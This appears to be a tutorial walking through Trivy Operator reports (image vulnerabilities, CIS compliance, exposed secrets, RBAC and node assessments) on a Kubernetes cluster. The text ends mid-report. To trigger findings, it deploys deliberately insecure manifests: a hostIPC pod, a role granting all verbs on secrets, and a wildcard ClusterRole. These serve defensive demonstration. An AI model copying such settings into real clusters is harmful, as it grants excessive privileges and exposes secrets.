Repository: library/nginx Tag: 1.22.0 Registry: Server: index.docker.io Scanner: Name: Trivy Vendor: Aqua Security Version: 0.38.2 Summary: Critical Count: 3 High Count: 18 Low Count: 0 Medium Count: 39 None Count: 0 Unknown Count: 0 Update Timestamp: 2023-03-14T04:28:11Z Vulnerabilities: Fixed Version: 7.74.0-1.3+deb11u5 Installed Version: 7.74.0-1.3+deb11u3 Links: Primary Link: https://avd.aquasec.com/nvd/cve-2022-32221 Resource: curl Score: 4.8 Severity: CRITICAL Target: Title: curl: POST following PUT confusion Vulnerability ID: CVE-2022-32221 Fixed Version: 7.74.0-1.3+deb11u7 Installed Version: 7.74.0-1.3+deb11u3 Links: Primary Link: https://avd.aquasec.com/nvd/cve-2023-23916 Resource: curl Score: 6.5 Severity: HIGH Target: Title: curl: HTTP multi-header compression denial of service Vulnerability ID: CVE-2023-23916 Fixed Version: 7.74.0-1.3+deb11u5 Installed Version: 7.74.0-1.3+deb11u3 Links: Primary Link: https://avd.aquasec.com/nvd/cve-2022-43552 Resource: curl Score: 5.9 Severity: MEDIUM ... You can easily obtain a list of container image vulnerabilities for the entire cluster: kubectl get vulnerabilityreports --all-namespaces -o wide NAMESPACE NAME REPOSITORY TAG SCANNER AGE CRITICAL HIGH MEDIUM LOW UNKNOWN cert-manager replicaset-6bdbc5f78f jetstack/cert-manager-cainjector v1.11.0 Trivy 12m 0 1 0 0 0 cert-manager replicaset-cert-manager-68784d64d7-cert-manager-controller jetstack/cert-manager-controller v1.11.0 Trivy 12m 0 1 0 0 0 cert-manager replicaset-cert-manager-webhook-6787f645b9-cert-manager-webhook jetstack/cert-manager-webhook v1.11.0 Trivy 13m 0 1 0 0 0 external-dns replicaset-external-dns-58995955b-external-dns external-dns/external-dns v0.13.2 Trivy 12m 0 13 4 0 0 forecastle replicaset-forecastle-7b645d64bf-forecastle stakater/forecastle v1.0.121 Trivy 12m 0 1 1 0 0 ingress-nginx replicaset-ingress-nginx-controller-f958b4d8d-controller ingress-nginx/controller Trivy 12m 2 3 2 0 0 karpenter replicaset-karpenter-565b558f9-controller karpenter/controller Trivy 12m 0 0 0 0 0 kube-prometheus-stack daemonset-6c9bb4f54f prometheus/node-exporter v1.5.0 Trivy 13m 0 1 1 0 0 kube-prometheus-stack replicaset-56c596c9bb curlimages/curl 7.85.0 Trivy 13m 0 6 3 0 0 kube-prometheus-stack replicaset-5b5d6f8fb8 kiwigrid/k8s-sidecar 1.22.0 Trivy 13m 0 7 2 0 0 kube-prometheus-stack replicaset-64556849bd prometheus-operator/prometheus-operator v0.63.0 Trivy 12m 0 1 1 0 0 kube-prometheus-stack replicaset-79cd99d94 kiwigrid/k8s-sidecar 1.22.0 Trivy 13m 0 7 2 0 0 kube-prometheus-stack replicaset-d894b795d kube-state-metrics/kube-state-metrics v2.8.1 Trivy 13m 0 1 0 0 0 kube-prometheus-stack replicaset-kube-prometheus-stack-grafana-646bc57bb6-grafana grafana/grafana 9.3.8 Trivy 13m 0 2 3 0 0 kube-prometheus-stack statefulset-55c7d87c7d prometheus-operator/prometheus-config-reloader v0.63.0 Trivy 13m 0 0 0 0 0 kube-prometheus-stack statefulset-646865b49b prometheus-operator/prometheus-config-reloader v0.63.0 Trivy 13m 0 0 0 0 0 kube-prometheus-stack statefulset-6547f6bbc9 prometheus/prometheus v2.42.0 Trivy 13m 0 2 0 0 0 kube-prometheus-stack statefulset-6ddfb59cf5 prometheus-operator/prometheus-config-reloader v0.63.0 Trivy 13m 0 0 0 0 0 kube-prometheus-stack statefulset-758c4b8b8 prometheus/alertmanager v0.25.0 Trivy 13m 0 2 0 0 0 kube-system daemonset-6b8684d996 aws-ec2/aws-node-termination-handler v1.19.0 Trivy 13m 0 2 1 0 0 kube-system replicaset-metrics-server-7df9d78f65-metrics-server metrics-server/metrics-server v0.6.2 Trivy 12m 1 3 2 0 0 mailhog replicaset-mailhog-6f54fccf85-mailhog cd2team/mailhog 1663459324 Trivy 13m 0 6 2 0 0 oauth2-proxy replicaset-oauth2-proxy-f5f86cd5d-oauth2-proxy oauth2-proxy/oauth2-proxy v7.4.0 Trivy 12m 0 8 3 0 0 test-trivy1 pod-nginx-nginx library/nginx 1.22.0 Trivy 12m 3 18 39 0 0 trivy-system replicaset-trivy-operator-56bdc96f8-trivy-operator aquasecurity/trivy-operator 0.12.1 Trivy 13m 0 0 0 0 0 Compliance Reports I will deploy a pod with hostIPC: true and then examine the compliance report. Links: CIS Kubernetes Benchmark Bad Pod #7: HOSTIPC Only Center for Internet Security Here is a list of the supported Compliance Reports: kubectl get clustercompliancereports NAME AGE cis 15m nsa 15m pss-baseline 15m pss-restricted 15m We are currently interested in the CIS Kubernetes Benchmark and specifically the control to “Minimize the admission of containers wishing to share the host IPC namespace”: kubectl get clustercompliancereports cis -o json | jq '.spec.compliance.controls[] | select(.name==\"Minimize the admission of containers wishing to share the host IPC namespace\")' { \"checks\": [ { \"id\": \"AVD-KSV-0008\" } ], \"description\": \"Do not generally permit containers to be run with the hostIPC flag set to true\", \"id\": \"5.2.4\", \"name\": \"Minimize the admission of containers wishing to share the host IPC namespace\", \"severity\": \"HIGH\" } Let’s create a new namespace with a pod that has the hostIPC: true parameter present in its Kubernetes YAML manifest: kubectl create namespace test-trivy2 kubectl apply --namespace=test-trivy2 -f - &lt;&lt; \\EOF apiVersion: v1 kind: Pod metadata: name: hostipc-exec-pod labels: app: pentest spec: automountServiceAccountToken: false hostIPC: true # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; This is the security issue containers: - name: hostipc-pod image: k8s.gcr.io/pause:3.6 resources: requests: memory: \"1Mi\" cpu: \"1m\" limits: memory: \"16Mi\" cpu: \"20m\" securityContext: allowPrivilegeEscalation: false capabilities: drop: - ALL readOnlyRootFilesystem: true runAsGroup: 30000 runAsNonRoot: true runAsUser: 20000 seccompProfile: type: RuntimeDefault EOF echo -n \"Waiting for trivy-operator to create ConfigAuditReports: \" until kubectl get configauditreports -n test-trivy2 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 5 done An instance of the ConfigAuditReports resource represents checks performed by Trivy against a Kubernetes object’s configuration. The introduced security issue is visible in the ConfigAuditReports: kubectl describe configauditreports -n test-trivy2 Name: pod-hostipc-exec-pod Namespace: test-trivy2 Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=7f9b85d646 trivy-operator.resource.kind=Pod trivy-operator.resource.name=hostipc-exec-pod trivy-operator.resource.namespace=test-trivy2 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: ConfigAuditReport Metadata: Creation Timestamp: 2023-03-14T04:41:51Z Generation: 2 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:41:53Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Pod Name: hostipc-exec-pod UID: c1b84929-b947-452c-95b4-d1fc2f8dc11d Resource Version: 117561 UID: 5deb58ae-b18d-4c85-b757-5e877c3abeae Report: Checks: Category: Kubernetes Security Check Check ID: KSV008 Description: Sharing the host's IPC namespace allows container processes to communicate with processes on the host. Messages: Pod 'hostipc-exec-pod' should not set 'spec.template.spec.hostIPC' to true Severity: HIGH Success: false Title: Access to host IPC namespace Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 0 High Count: 1 Low Count: 0 Medium Count: 0 Update Timestamp: 2023-03-14T04:41:53Z Events: &lt;none&gt; As in the previous example, you can see the compliance report for the entire cluster: kubectl get configauditreports --all-namespaces -o wide NAMESPACE NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW cert-manager replicaset-cert-manager-68784d64d7 Trivy 16m 0 0 0 7 cert-manager replicaset-cert-manager-cainjector-547c9b8f95 Trivy 15m 0 0 0 7 cert-manager replicaset-cert-manager-webhook-6787f645b9 Trivy 14m 0 0 0 7 cert-manager service-cert-manager Trivy 14m 0 0 0 0 cert-manager service-cert-manager-webhook Trivy 15m 0 0 0 0 default service-kubernetes Trivy 14m 0 0 0 1 external-dns replicaset-external-dns-58995955b Trivy 16m 0 0 1 6 external-dns service-external-dns Trivy 15m 0 0 0 0 forecastle replicaset-forecastle-7b645d64bf Trivy 15m 0 0 2 10 forecastle service-forecastle Trivy 15m 0 0 0 0 ingress-nginx replicaset-ingress-nginx-controller-f958b4d8d Trivy 15m 0 0 3 6 ingress-nginx service-ingress-nginx-controller Trivy 14m 0 0 0 0 ingress-nginx service-ingress-nginx-controller-admission Trivy 15m 0 0 0 0 ingress-nginx service-ingress-nginx-controller-metrics Trivy 15m 0 0 0 0 karpenter replicaset-karpenter-565b558f9 Trivy 15m 0 0 2 10 karpenter service-karpenter Trivy 15m 0 0 0 0 kube-prometheus-stack daemonset-kube-prometheus-stack-prometheus-node-exporter Trivy 15m 0 3 2 10 kube-prometheus-stack replicaset-kube-prometheus-stack-grafana-646bc57bb6 Trivy 14m 0 0 8 34 kube-prometheus-stack replicaset-kube-prometheus-stack-kube-state-metrics-5979d9d98c Trivy 16m 0 0 2 10 kube-prometheus-stack replicaset-kube-prometheus-stack-operator-5df65d688f Trivy 15m 0 0 0 9 kube-prometheus-stack service-alertmanager-operated Trivy 14m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-alertmanager Trivy 16m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-grafana Trivy 15m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-kube-state-metrics Trivy 16m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-operator Trivy 16m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-prometheus Trivy 14m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-prometheus-node-exporter Trivy 14m 0 0 0 0 kube-prometheus-stack service-prometheus-operated Trivy 14m 0 0 0 0 kube-prometheus-stack statefulset-alertmanager-kube-prometheus-stack-alertmanager Trivy 16m 0 0 0 8 kube-prometheus-stack statefulset-prometheus-kube-prometheus-stack-prometheus Trivy 16m 0 0 0 11 kube-system daemonset-aws-node Trivy 16m 0 3 7 17 kube-system daemonset-aws-node-termination-handler Trivy 15m 0 1 2 9 kube-system daemonset-ebs-csi-node Trivy 15m 0 1 8 12 kube-system daemonset-ebs-csi-node-windows Trivy 16m 0 0 8 14 kube-system daemonset-kube-proxy Trivy 16m 0 2 4 9 kube-system replicaset-coredns-7975d6fb9b Trivy 14m 0 0 3 5 kube-system replicaset-ebs-csi-controller-646b59c99 Trivy 15m 0 0 1 20 kube-system replicaset-metrics-server-7df9d78f65 Trivy 15m 0 0 1 9 kube-system service-kube-dns Trivy 15m 0 0 1 0 kube-system service-kube-prometheus-stack-coredns Trivy 14m 0 0 1 0 kube-system service-kube-prometheus-stack-kubelet Trivy 14m 0 0 1 0 kube-system service-metrics-server Trivy 14m 0 0 1 0 mailhog replicaset-mailhog-6f54fccf85 Trivy 14m 0 0 0 7 mailhog service-mailhog Trivy 16m 0 0 0 0 oauth2-proxy replicaset-oauth2-proxy-f5f86cd5d Trivy 15m 0 0 2 10 oauth2-proxy service-oauth2-proxy Trivy 14m 0 0 0 0 test-trivy1 pod-nginx Trivy 15m 0 0 3 10 test-trivy2 pod-hostipc-exec-pod Trivy 59s 0 1 0 0 trivy-system replicaset-trivy-operator-56bdc96f8 Trivy 14m 0 0 1 7 trivy-system service-trivy-operator Trivy 15m 0 0 0 0 Exposed Secrets Report An ExposedSecretReport represents secrets found in a container image of a given Kubernetes workload. Consider an example of a container that has SSH keys embedded within it: kubectl create namespace test-trivy3 kubectl run ubuntu-sshd-exposed-secrets --namespace=test-trivy3 --image=peru/ubuntu_sshd --overrides='{\"spec\": { \"nodeSelector\": {\"kubernetes.io/arch\": \"amd64\"}}}' echo -n \"Waiting for trivy-operator to create ExposedSecretReports: \" until kubectl get exposedsecretreports -n test-trivy3 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 3 done After examining the ExposedSecretReport details, it should be easy to identify the problem: kubectl describe exposedsecretreport -n test-trivy3 Name: pod-ubuntu-sshd-exposed-secrets-ubuntu-sshd-exposed-secrets Namespace: test-trivy3 Labels: resource-spec-hash=b9d794b6b trivy-operator.container.name=ubuntu-sshd-exposed-secrets trivy-operator.resource.kind=Pod trivy-operator.resource.name=ubuntu-sshd-exposed-secrets trivy-operator.resource.namespace=test-trivy3 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: ExposedSecretReport Metadata: Creation Timestamp: 2023-03-14T04:44:08Z Generation: 2 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:44:38Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Pod Name: ubuntu-sshd-exposed-secrets UID: d3a57ab4-e187-4e76-8691-2a97ef293c62 Resource Version: 118720 UID: 23a924b1-ac50-4cc9-957b-6b28ad504b65 Report: Artifact: Repository: peru/ubuntu_sshd Tag: latest Registry: Server: index.docker.io Scanner: Name: Trivy Vendor: Aqua Security Version: 0.38.2 Secrets: Category: AsymmetricPrivateKey Match: ----BEGIN RSA PRIVATE KEY-----**********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************-----END RSA PRIVATE Rule ID: private-key Severity: HIGH Target: /etc/ssh/ssh_host_rsa_key Title: Asymmetric Private Key Category: AsymmetricPrivateKey Match: -----BEGIN EC PRIVATE KEY-----************************************************************************************************************************************************************************-----END EC PRIVATE Rule ID: private-key Severity: HIGH Target: /etc/ssh/ssh_host_ecdsa_key Title: Asymmetric Private Key Category: AsymmetricPrivateKey Match: BEGIN OPENSSH PRIVATE KEY-----******************************************************************************************************************************************************************************************************************************************************************************************************************************************************-----END OPENSSH PRI Rule ID: private-key Severity: HIGH Target: /etc/ssh/ssh_host_ed25519_key Title: Asymmetric Private Key Summary: Critical Count: 0 High Count: 3 Low Count: 0 Medium Count: 0 Update Timestamp: 2023-03-14T04:44:38Z Events: &lt;none&gt; A cluster-wide output will show us the complete picture of exposed secrets: kubectl get exposedsecretreport -n test-trivy3 -o wide NAME REPOSITORY TAG SCANNER AGE CRITICAL HIGH MEDIUM LOW pod-ubuntu-sshd-exposed-secrets-ubuntu-sshd-exposed-secrets peru/ubuntu_sshd latest Trivy 99s 0 3 0 0 RBAC Assessment Report The RBAC Assessment Report exists in two “versions” (Custom Resource Definitions - CRDs): RbacAssessmentReport ClusterRbacAssessmentReport RbacAssessmentReport Let’s consider an example with a role that allows manipulation and reading of secrets: kubectl create namespace test-trivy4 kubectl apply --namespace=test-trivy4 -f - &lt;&lt; \\EOF apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: secret-reader rules: - apiGroups: [\"\"] resources: [\"secrets\"] verbs: [\"*\"]# &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; This is the security issue EOF echo -n \"Waiting for trivy-operator to create RbacAssessmentReport: \" until kubectl get rbacassessmentreport -n test-trivy4 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 3 done The generated RbacAssessmentReport will contain a CRITICAL issue related to secret management: kubectl describe rbacassessmentreport --namespace test-trivy4 Name: role-secret-reader Namespace: test-trivy4 Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=6f775df776 trivy-operator.resource.kind=Role trivy-operator.resource.name=secret-reader trivy-operator.resource.namespace=test-trivy4 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: RbacAssessmentReport Metadata: Creation Timestamp: 2023-03-14T04:46:33Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:46:33Z Owner References: API Version: rbac.authorization.k8s.io/v1 Block Owner Deletion: false Controller: true Kind: Role Name: secret-reader UID: d97c0dc5-6d81-440a-9bc3-6e7c3621635c Resource Version: 119225 UID: 6b9a7b0f-768e-4487-b288-538433e2045d Report: Checks: Category: Kubernetes Security Check Check ID: KSV045 Description: Check whether role permits wildcard verb on specific resources Messages: Role permits wildcard verb on specific resources Severity: CRITICAL Success: false Title: No wildcard verb roles Category: Kubernetes Security Check Check ID: KSV041 Description: Check whether role permits managing secrets Messages: Role permits management of secret(s) Severity: CRITICAL Success: false Title: Do not allow management of secrets Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 2 High Count: 0 Low Count: 0 Medium Count: 0 Events: &lt;none&gt; You can also view all “Role issues” in the cluster: kubectl get rbacassessmentreport --all-namespaces --output=wide NAMESPACE NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW cert-manager role-565fd84cf Trivy 21m 1 0 0 0 default role-864ddd97cb Trivy 19m 0 1 0 1 ingress-nginx role-ingress-nginx Trivy 20m 1 0 0 0 karpenter role-karpenter Trivy 19m 1 0 1 0 kube-prometheus-stack role-kube-prometheus-stack-grafana Trivy 19m 0 0 0 0 kube-public role-b99d4b8d7 Trivy 20m 0 0 1 0 kube-system role-54bf889b86 Trivy 19m 0 0 1 0 kube-system role-5c6cd5c956 Trivy 19m 0 0 0 0 kube-system role-5cc59f98f6 Trivy 19m 0 0 0 0 kube-system role-5df4dbbd98 Trivy 19m 0 0 1 0 kube-system role-668d4b4c7b Trivy 20m 0 2 1 0 kube-system role-6fbccbcb9d Trivy 19m 0 0 1 0 kube-system role-77cd64c645 Trivy 19m 0 0 1 0 kube-system role-79f88497 Trivy 19m 0 0 1 0 kube-system role-7f4d588ff9 Trivy 18m 0 0 0 0 kube-system role-8498b9b6d4 Trivy 19m 0 0 1 0 kube-system role-864ddd97cb Trivy 20m 0 0 0 0 kube-system role-868458b9d6 Trivy 20m 1 0 0 0 kube-system role-8c86c9467 Trivy 19m 0 0 0 0 kube-system role-b99d4b8d7 Trivy 19m 1 0 0 0 kube-system role-eks-vpc-resource-controller-role Trivy 19m 0 0 1 0 kube-system role-extension-apiserver-authentication-reader Trivy 19m 0 0 0 0 kube-system role-karpenter-dns Trivy 20m 0 0 0 0 test-trivy4 role-secret-reader Trivy 49s 2 0 0 0 trivy-system role-trivy-operator Trivy 21m 1 0 1 0 trivy-system role-trivy-operator-leader-election Trivy 19m 0 0 0 0 ClusterRbacAssessmentReport Creating the following ClusterRole will cause another security violation against the principle of least privilege. kubectl apply -f - &lt;&lt; \\EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: wildcard-resource rules: - apiGroups: [\"\"] resources: [\"*\"] # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; This is the security issue verbs: [\"*\"] EOF echo -n \"Waiting for trivy-operator to create ClusterRbacAssessmentReport: \" until kubectl get clusterrbacassessmentreport clusterrole-wildcard-resource 2&gt; /dev/null; do echo -n \".\" sleep 3 done See the details below: kubectl describe clusterrbacassessmentreport clusterrole-wildcard-resource Name: clusterrole-wildcard-resource Namespace: Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=6c64bd7d7 trivy-operator.resource.kind=ClusterRole trivy-operator.resource.name=wildcard-resource trivy-operator.resource.namespace= Annotations: &lt;none&gt; API Version: aquasecurity.github.io/v1alpha1 Kind: ClusterRbacAssessmentReport Metadata: Creation Timestamp: 2023-03-14T04:47:57Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:47:57Z Owner References: API Version: rbac.authorization.k8s.io/v1 Block Owner Deletion: false Controller: true Kind: ClusterRole Name: wildcard-resource UID: ef842392-d8cc-47c9-b60d-8a713232596b Resource Version: 119581 UID: 1fc1eb0a-7ad4-4ee9-9e1a-725847e2ed11 Report: Checks: Category: Kubernetes Security Check Check ID: KSV046 Description: Check whether role permits specific verb on wildcard resources Messages: Role permits specific verb on wildcard resource Severity: CRITICAL Success: false Title: No wildcard resource roles Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 1 High Count: 0 Low Count: 0 Medium Count: 0 Events: &lt;none&gt; View all “ClusterRole issues” in the cluster: kubectl get clusterrbacassessmentreport --all-namespaces --output=wide NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW clusterrole-54bb85d744 Trivy 20m 0 0 0 0 clusterrole-54bf889b86 Trivy 21m 0 0 0 0 clusterrole-54ccb57cc4 Trivy 20m 0 0 0 0 clusterrole-54cdc9b678 Trivy 21m 1 0 0 0 clusterrole-5585c7b9ff Trivy 19m 0 0 0 0 clusterrole-565cd5fdf Trivy 19m 0 0 0 0 clusterrole-567cc86fc6 Trivy 19m 0 0 0 0 clusterrole-569d87574c Trivy 22m 1 0 0 0 clusterrole-575b7f6784 Trivy 20m 0 0 0 0 clusterrole-57d745d4cc Trivy 23m 1 0 0 0 clusterrole-5857f84f59 Trivy 21m 0 0 0 0 clusterrole-58bfc7788d Trivy 20m 0 0 0 0 clusterrole-59dc5c9cb6 Trivy 19m 0 0 0 0 clusterrole-5b458986c5 Trivy 19m 0 0 0 0 clusterrole-5b97d66885 Trivy 20m 0 0 0 0 clusterrole-5bd7cc878d Trivy 19m 0 0 0 0 clusterrole-5c6cd5c956 Trivy 20m 0 0 0 0 clusterrole-5cbfdf6f9d Trivy 21m 0 0 0 0 clusterrole-5f9f8f6b4c Trivy 21m 1 0 0 0 clusterrole-644b85fbb5 Trivy 21m 0 0 0 0 clusterrole-6496b874bc Trivy 20m 0 0 0 0 clusterrole-64cd5dd8c5 Trivy 19m 0 0 0 0 clusterrole-64f9898979 Trivy 21m 0 0 0 0 clusterrole-658cbf7c48 Trivy 19m 0 0 0 0 clusterrole-6594cc4fb6 Trivy 19m 0 1 0 0 clusterrole-65bd45754b Trivy 20m 0 0 0 0 clusterrole-65ff89d4f6 Trivy 19m 0 0 0 0 clusterrole-668d4b4c7b Trivy 19m 2 0 0 0 clusterrole-679f75d6b5 Trivy 21m 0 0 0 0 clusterrole-6858fccb98 Trivy 21m 0 0 0 0 clusterrole-68679985fd Trivy 19m 0 0 0 0 clusterrole-69c4fbc9c4 Trivy 20m 1 0 0 0 clusterrole-6b696dd9d5 Trivy 20m 0 0 0 0 clusterrole-6b6f997745 Trivy 20m 0 0 0 0 clusterrole-6c9cb84f7b Trivy 20m 0 0 0 0 clusterrole-6d7d6f9d9c Trivy 22m 0 1 0 0 clusterrole-6f54fcfddd Trivy 20m 0 0 0 0 clusterrole-6f647d9bdc Trivy 20m 0 0 0 0 clusterrole-6f69bb5b79 Trivy 21m 0 0 0 0 clusterrole-74586d59d6 Trivy 20m 0 0 1 0 clusterrole-74f98bf848 Trivy 20m 0 0 0 0 clusterrole-7557d9789b Trivy 20m 0 0 0 0 clusterrole-75f5d55dd8 Trivy 21m 0 0 0 0 clusterrole-76c6b6cf99 Trivy 19m 0 0 0 0 clusterrole-77898f44f5 Trivy 21m 0 1 0 0 clusterrole-779895897b Trivy 21m 0 0 0 0 clusterrole-779f88d9b5 Trivy 21m 0 1 0 0 clusterrole-77f88d49d Trivy 23m 0 0 0 0 clusterrole-79d4fc89cd Trivy 22m 1 0 0 0 clusterrole-79ff87886f Trivy 20m 0 0 0 0 clusterrole-7b884bc5d8 Trivy 21m 1 2 1 0 clusterrole-7bdcc749f8 Trivy 19m 0 1 0 0 clusterrole-7c4d8f665 Trivy 19m 1 1 0 0 clusterrole-7c5d4b78b6 Trivy 20m 0 1 0 0 clusterrole-7c7649d468 Trivy 22m 0 0 0 0 clusterrole-7dfccfdf Trivy 19m 0 0 0 0 clusterrole-7f76ddfb76 Trivy 20m 0 0 0 0 clusterrole-7f7cc8689f Trivy 20m 0 0 0 0 clusterrole-7ff7dbc7fd Trivy 20m 0 0 0 0 clusterrole-8498b9b6d4 Trivy 20m 0 0 0 0 clusterrole-8545bb4f4d Trivy 20m 0 0 0 0 clusterrole-865d464ff8 Trivy 20m 0 0 0 0 clusterrole-8686d64c5 Trivy 19m 0 1 0 0 clusterrole-8689f7c759 Trivy 21m 0 0 0 0 clusterrole-86ccd5dd47 Trivy 20m 1 0 0 0 clusterrole-889f4b7cc Trivy 20m 0 0 0 0 clusterrole-8b7445588 Trivy 22m 0 0 0 0 clusterrole-96685f56d Trivy 20m 0 1 0 0 clusterrole-984fc85d Trivy 21m 0 1 0 0 clusterrole-9d8f67c6d Trivy 20m 0 0 0 0 clusterrole-admin Trivy 20m 2 2 1 0 clusterrole-aggregate-config-audit-reports-view Trivy 20m 0 0 0 0 clusterrole-aggregate-exposed-secret-reports-view Trivy 20m 0 0 0 0 clusterrole-aggregate-vulnerability-reports-view Trivy 20m 0 0 0 0 clusterrole-aws-node Trivy 19m 1 0 0 0 clusterrole-aws-node-termination-handler Trivy 20m 0 0 0 0 clusterrole-b754c4cc6 Trivy 20m 2 1 0 0 clusterrole-bf7d9ff77 Trivy 21m 0 0 1 0 clusterrole-c497699bd Trivy 20m 0 0 0 0 clusterrole-cert-manager-cainjector Trivy 19m 1 0 0 0 clusterrole-cert-manager-controller-certificates Trivy 19m 1 0 0 0 clusterrole-cert-manager-controller-certificatesigningrequests Trivy 20m 0 0 0 0 clusterrole-cert-manager-controller-challenges Trivy 20m 1 1 0 0 clusterrole-cert-manager-controller-clusterissuers Trivy 19m 1 0 0 0 clusterrole-cert-manager-controller-ingress-shim Trivy 21m 0 0 0 0 clusterrole-cert-manager-controller-issuers Trivy 20m 1 0 0 0 clusterrole-cert-manager-controller-orders Trivy 19m 1 0 0 0 clusterrole-cert-manager-edit Trivy 21m 0 0 0 0 clusterrole-cert-manager-view Trivy 20m 0 0 0 0 clusterrole-cf7d59df5 Trivy 19m 0 0 0 0 clusterrole-cluster-admin Trivy 22m 2 0 0 0 clusterrole-d6d6b6c99 Trivy 19m 0 0 0 0 clusterrole-df67d86bd Trivy 19m 0 1 0 0 clusterrole-ebs-csi-node-role Trivy 20m 0 0 0 0 clusterrole-ebs-external-attacher-role Trivy 19m 0 0 0 0 clusterrole-ebs-external-provisioner-role Trivy 19m 0 0 0 0 clusterrole-ebs-external-resizer-role Trivy 20m 0 0 0 0 clusterrole-ebs-external-snapshotter-role Trivy 20m 0 0 0 0 clusterrole-edit Trivy 20m 1 2 1 0 clusterrole-external-dns Trivy 20m 0 0 0 0 clusterrole-f44d6476f Trivy 19m 0 0 0 0 clusterrole-forecastle-cluster-ingress-role Trivy 20m 0 0 0 0 clusterrole-ingress-nginx Trivy 19m 1 0 0 0 clusterrole-karpenter Trivy 19m 0 0 0 0 clusterrole-karpenter-admin Trivy 20m 0 0 0 0 clusterrole-karpenter-core Trivy 20m 0 0 0 0 clusterrole-kube-prometheus-stack-grafana-clusterrole Trivy 20m 1 0 0 0 clusterrole-kube-prometheus-stack-kube-state-metrics Trivy 19m 1 0 0 0 clusterrole-kube-prometheus-stack-operator Trivy 19m 2 2 1 0 clusterrole-kube-prometheus-stack-prometheus Trivy 21m 0 0 0 0 clusterrole-trivy-operator Trivy 21m 1 1 0 0 clusterrole-view Trivy 21m 0 0 0 0 clusterrole-vpc-resource-controller-role Trivy 23m 0 0 0 0 clusterrole-wildcard-resource Trivy 97s 1 0 0 0 Cluster Infra Assessment Reports Cluster Infra Assessment Reports should help you with hardening your Kubernetes cluster. Since I’m using Amazon EKS (a managed service), I’m not sure how useful this report is in this context, but I will test it for reference. View a cluster summary of node issues: kubectl get clusterinfraassessmentreports -o wide NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW node-ip-192-168-12-204.ec2.internal Trivy 23m 5 5 0 0 node-ip-192-168-77-76.ec2.internal Trivy 6m5s 5 5 0 0 node-ip-192-168-8-119.ec2.internal Trivy 24m 5 5 0 0 Details about the nodes: NODE=$(kubectl get clusterinfraassessmentreports --no-headers=true -o custom-columns=\":metadata.name\" | head -1) kubectl describe clusterinfraassessmentreports \"${NODE}\" Name: node-ip-192-168-12-204.ec2.internal Namespace: Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=54fdd9476 trivy-operator.resource.kind=Node trivy-operator.resource.name=ip-192-168-12-204.ec2.internal trivy-operator.resource.namespace= Annotations: &lt;none&gt; API Version: aquasecurity.github.io/v1alpha1 Kind: ClusterInfraAssessmentReport Metadata: Creation Timestamp: 2023-03-14T04:26:37Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 Fields Type: FieldsV1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:26:37Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Node Name: ip-192-168-12-204.ec2.internal UID: d74b3dc1-eed2-45e8-af14-b7ca8c49277a Resource Version: 113102 UID: c19ff166-d97c-4b16-94c2-17c39101cb69 Report: Checks: Category: Kubernetes Security Check Check ID: KCV0089 Description: Setup TLS connection on the Kubelets. Messages: Ensure that the --tls-key-file argument are set as appropriate Severity: CRITICAL Success: false Title: Ensure that the --tls-key-file argument are set as appropriate Category: Kubernetes Security Check Check ID: KCV0088 Description: Setup TLS connection on the Kubelets. Messages: Ensure that the --tls-cert-file argument are set as appropriate Severity: CRITICAL Success: false Title: Ensure that the --tls-cert-file argument are set as appropriate Category: Kubernetes Security Check Check ID: KCV0091 Description: Enable kubelet server certificate rotation. Messages: Verify that the RotateKubeletServerCertificate argument is set to true Severity: HIGH Success: false Title: Verify that the RotateKubeletServerCertificate argument is set to true Category: Kubernetes Security Check Check ID: KCV0079 Description: Disable anonymous requests to the Kubelet server. Messages: Ensure that the --anonymous-auth argument is set to false Severity: CRITICAL Success: false Title: Ensure that the --anonymous-auth argument is set to false Category: Kubernetes Security 